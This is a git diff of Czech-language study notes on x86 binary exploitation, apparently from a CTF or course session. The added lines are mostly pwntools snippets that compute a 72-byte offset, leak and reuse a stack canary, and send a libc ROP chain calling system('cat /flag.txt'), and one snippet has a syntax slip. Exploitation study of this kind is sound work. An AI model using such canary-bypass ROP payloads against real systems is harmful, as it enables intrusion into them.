@@ -2,7 +2,7 @@
 
 ---
 
-## x86
+## Témata
 
 - Assembly
 	- Intel zápis 
@@ -304,6 +304,8 @@ info proc mappings
 ![[Pasted image 20240121221020.png]]
 ![[Pasted image 20240121221104.png]]
 
+---
+
 ```py
 >>> hex(libc.sym['system'])
 '0x7f8e171f7760'
@@ -311,3 +313,66 @@ info proc mappings
 
 ![[Pasted image 20240121221343.png]]
 
+![[Pasted image 20240121221825.png]]
+
+---
+
+![[Buffer Overflow 2024-01-21 22.34.42.excalidraw]]
+
+---
+
+```asm
+MOV EDI, 0x1
+```
+
+---
+
+```asm
+POP EDI
+RET
+```
+
+---
+
+```py
+>>> rop = ROP(libc, badchars=b'\n')
+>>> rop.call(libc.sym['exit'], 0)
+```
+
+```py
+>>> rop = ROP(libc, base, badchar='b\n')
+>>> rop.call(libc.sym['system'], 'cat /flag.txt')
+>>> rop.call(libc.sym['exit'], 0)
+```
+
+---
+
+![[Pasted image 20240121224128.png]]
+![[Pasted image 20240121224352.png]]
+
+0x10-0x58 = 0x48 = 72
+
+---
+
+```py
+>>> io.sendline(flat({
+	72: canary,
+	88: rop.build()
+}))
+```
+
+---
+
+![[Pasted image 20240121224927.png]]
+
+`system + 0x2c`
+
+---
+
+```py
+>>> io.sendline(flat({
+	72: canary,
+	88: libc.sym['system'] + 0x2c
+	96: rop.build()
+}))
+```
